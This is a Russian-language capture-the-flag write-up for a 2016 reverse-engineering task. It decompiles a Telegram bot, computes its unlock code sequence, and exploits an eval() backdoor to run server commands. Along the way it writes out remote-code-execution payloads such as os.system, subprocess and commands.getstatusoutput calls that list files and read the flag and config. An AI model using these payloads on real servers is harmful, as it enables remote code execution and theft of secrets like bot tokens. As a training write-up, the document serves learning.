## HACKYOU.CTF.SU REVERSE 200 TELEBOT

И так перед нами следующая задача:

 ![telebot_task_rev_200](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hackyou.ctf.su/reverse_200_telebot/imgs/telebot_task_rev_200.png)

Нам дается файл .pyc и информация о том что этот файл является исполняемым кодом бота @spbctf1_bot. Прежде всего скачиваем этот файл. Так как это скопилированный код python нужно прежде всего его дизассемблировать или декомпилировать. Для этого можно воспользоваться инструментом uncompyle6 и выполним следующую команду:

```bash
uncompyle6 -o . rev200_bot_7b541a1.pyc
```

После декомпиляции получаем следующее содержимое исходного кода бота (декомпиляция прошла успешно, без вяких проблем):

```python
# Python bytecode 2.7 (62211) disassembled from Python 2.7
# Embedded file name: ./bot.py
# Compiled at: 2016-10-15 21:50:04
import config
import traceback
import re
from base64 import *
from twx.botapi import TelegramBot, ReplyKeyboardMarkup, ReplyKeyboardHide
sec_state = {}

def process_message(bot, u):
    if u.message.sender and u.message.text and u.message.chat:
        chat_id = u.message.chat.id
        user = u.message.sender.username
        reply_hide = ReplyKeyboardHide.create()
        print 'user:%s mes:%s' % (user, u.message.text)
        if user not in sec_state:
            sec_state[user] = {'mode': 15,
             'stage': 7}
        cmd1 = u.message.text.encode('utf-8')
        a = re.findall('(\\/\\w+)\\s*(.*)', cmd1)
        if a:
            cmd = a[0][0]
            data = a[0][1]
            if cmd == '/help':
                bot.send_message(chat_id, 'Usage: \n\n/help - show this help\n/enter - enter secret mode\n', reply_markup=reply_hide)
            if cmd == '/enter':
                keyboard = [['-7-', '-8-', '-9-'],
                 ['-4-', '-5-', '-6-'],
                 ['-1-', '-2-', '-3-'],
                 ['-0-']]
                reply_markup = ReplyKeyboardMarkup.create(keyboard)
                bot.send_message(chat_id, 'please enter access code', reply_markup=reply_markup).wait()
            if sec_state[user]['mode'] == 0 and cmd == '/7779317':
                ddd = b64decode(data)
                bot.send_message(chat_id, eval(ddd))
        a = re.findall('-(\\d+)-', cmd1)
        if a:
            num = a[0]
            if int(num) == sec_state[user]['stage']:
                sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
                sec_state[user]['mode'] = sec_state[user]['mode'] - 1
                if sec_state[user]['mode'] < 0:
                    sec_state[user]['mode'] = 0
                if sec_state[user]['mode'] == 0:
                    bot.send_message(chat_id, 'Secret mode enabled!', reply_markup=reply_hide).wait()
            else:
                print 'NO', num, sec_state[user]['stage']
                bot.send_message(chat_id, 'Invalid password!', reply_markup=reply_hide).wait()
                sec_state[user]['mode'] = 15


bot = TelegramBot(config.token)
bot.update_bot_info().wait()
print bot.username
last_update_id = 0
while True:
    updates = bot.get_updates(offset=last_update_id).wait()
    try:
        for update in updates:
            if int(update.update_id) > int(last_update_id):
                last_update_id = update.update_id
                process_message(bot, update)

    except Exception as ex:
        print traceback.format_exc()
```

Теперь нам предстоит проанализировать код данного бота и понять в чем заключается решение которое приведет к получению флага. Хочу отметить, что тут как бы не только Reverse сам по себе, но и еще умение разобраться в коде, понять как он работает и воспользоваться результатами анализа, так как результат непосредственно не представлен в самом коде.

Присмотримся к коду, видим следующие примечательные части: 

```python
bot.send_message(chat_id, 'Secret mode enabled!',
```

и 

```python
 sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
```

и еще:

```python
 if sec_state[user]['mode'] == 0 and cmd == '/7779317':
	ddd = b64decode(data)
	bot.send_message(chat_id, eval(ddd))
```

Какой вывод из представленных частей кода бота мы можем сделать? Во-первых в коде боте присутствует активация некого секретного режима, доступ к открытию которого представлен в вычислениях с магическим числом 1337. После активации секретного режима становится возможным выполнения на стороне сервера команд python иначе говоря возможно удаленное выполнение кода.

Приступим к анализу кода приводящего к включению секретного режима. Обратим внимание на код `if int(num) == sec_state[user]['stage']:` , если у нас значение stage совпадает со значением, которое мы введем, общаясь с ботом, то включается механизм вычисления следующего числа для `stage` и это даем нам необходимость его вычислять по формуле `(stage * stage ^ 1337) % 10` . 

Для начала нам нужно отыскать этого бота и попробовать с ним побщаться:

 ![start_bot](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hackyou.ctf.su/reverse_200_telebot/imgs/start_bot.png)

Нажимаем start и начинаем общаться.

 ![bot_start](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hackyou.ctf.su/reverse_200_telebot/imgs/bot_start.png)

Пока что тишина, но мы знаем из документации что у каждого бота есть команда `/help` и из самого кода бота мы тоже можем видеть список поддерживаемых команд. Наберем команду `/help` и посмотрим на вывод.

 ![bot_help](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hackyou.ctf.su/reverse_200_telebot/imgs/bot_help.png)

Видим что в декомпилированном коде и при обращении к боту одинаковые команды. Воспользуемся командой `/enter` и после этого нам нужно будет вводить поочередно коды для активации секретного режима. Судя по коду, понятно что начальное значение для stage пользователя это цифра `7`, но ее нужно вводить в формате `-7- `. Введем эту цифру и если, мы все сделали правильно, то бот не будет ругаться.

 ![bot_enter_7](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hackyou.ctf.su/reverse_200_telebot/imgs/bot_enter_7.png)

Бот не ругается, значит у нас все в порядке. Но теперь нужно вычислить следующую цифру, вспоминаем про алгоритм `(stage * stage ^ 1337) % 10` и конечно же автомаизация рулит, напишем скрипт, для получения сколь угодно длинной цепочки, которую нужно вводить. У меня получился вот такой скрипт:

```python
import sys
num = int(sys.argv[1])
for i in range(15):
   num = (num * num ^ 1337) % 10
   print num
```

Этот небольшой код, нам очень поможет. Запускаем его и получаем следующий вывод:

```bash
8
1
6
9
4
1
6
9
4
1
6
9
4
1
```

Теперь нам нужно поочередно вводить данные цифры, если ошибемся бот будет не доволен и нам придется все начинать сначала. Если правильно все ввели (это 14 цифр), то получаем сообщение "Secret mode enabled":

 ![bot_secret_mode](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hackyou.ctf.su/reverse_200_telebot/imgs/bot_secret_mode.png)

Теперь нужно двигаться дальше, вспоминаем код:

```python
 if sec_state[user]['mode'] == 0 and cmd == '/7779317':
	ddd = b64decode(data)
	bot.send_message(chat_id, eval(ddd))
```

Видим что наш `mode` уже равен 0 так как секретный режим активен. Теперь видим, что для выполнения команды какой либо, она должна быть закодирована в base64 и для отправки команды нужно воспользоваться секретной командой бота `/7779317 код_в_base64`, для того чтобы удостовериться, пробуем простейшую команду отправить на сложение двух чисел `echo -e "1+1" | base64`  и получаем команду ` ![BOOOT1](imgs\BOOOT1.png)` и сразу же выполним ее.

 ![eval_python](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hackyou.ctf.su/reverse_200_telebot/imgs/eval_python.png)

Работает! Значит исполнение кода возможно! Теперь будем пробовать посмотрть различные переменные в конфиге. У меня были различные подозрения что флаг в конфиге и нужно его посомтреть, но нет там его не было, все что можно было увидеть это токен самого бота, но он не интересен. Тогда у меня пришла мысль каким то образом получить список файлов расположенных рядом с ботом и тут началась эпопея, ибо те команды которые я как думал будут работать на сервере - не работали, хотя локально было понятно что по идее должно работать. Дальше стало понятно почему, так. 

Пробуем различные команды:

![BotToken](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hackyou.ctf.su/reverse_200_telebot/imgs/BotToken.png)

На представленном изображении видно как я подбирал и искал флаг, причем когда я дошел до средств чтения данных из файла в python, то обнаружил что в выводе я получат код их исполнения и больше ничего! Было очень обидно и нужно было найти какой-то способ.

Вот такие команды я пытался выполнить:

```python
 echo -e "__import__('os').system('ls')" | base64
 echo -e "__import__('os').system('flag')" | base64
 echo -e "__import__('os').popen('config.py').read()" | base64
 echo -e "__import__('os').popen('config.pyc').read()" | base64
 echo -e "__import__('os').system('cat ./config.py')" | base64
 echo -e "__import__('os').popen('./config.py').read()" | base64
 echo -e "__import__('subprocess').check_output("ls", shell=True)" | base64
```

Но мне приходил либо код выполнения фунции либо размер файла в байтах, ну в общем не то что нужно.

В итоге решающей командой, которая дала мне возможность получить список файлов оказалась `echo -e "__import__('commands').getstatusoutput('ls -al')[1]" | base64`  И вот перед нами структура файлов в директории бота:

 ![chat_bot_3](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hackyou.ctf.su/reverse_200_telebot/imgs/chat_bot_3.png)

Таким образом я вижу что рядом с ботом лежим файл с флагом. Особенность того способа что я применил для получения вывода в том что резульат выполнения команды это tuple состоящая из двух частей, в первой выводится код выполнеия команды, затем цельная строка с выводом результатов команды:

```python
>>> __import__('commands').getstatusoutput('ls -al')
(0, 'информация о списке файлов в директории в одну строку без переносов')
```

Мы можем теперь выполнить команду на получение содержимого файла:

```
echo -e "__import__('commands').getstatusoutput('cat flag')[1]" | base64
```

И после выполнения данной команды в окне с ботом, получаем наш заветный флаг!

 ![get_flag_bot](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hackyou.ctf.su/reverse_200_telebot/imgs/get_flag_bot.png)

И заветные 200 очков. Да и во флаге есть скрытый смысл! Ибо это правда - боты в тренде! 

P.S. В ходе CTF некоторые люди стали отправлять от имени бота всякую гадость и организаторам пришлось ограничить длину выполняемой команды до 15 символов, что соответственно сделало неработоспособным мое решение, но самое главное до этих инцидентов, я успел получить флаг. Флаг на изображени выше он выделен в окне чата c ботом.

**Автор: n0z3r0**
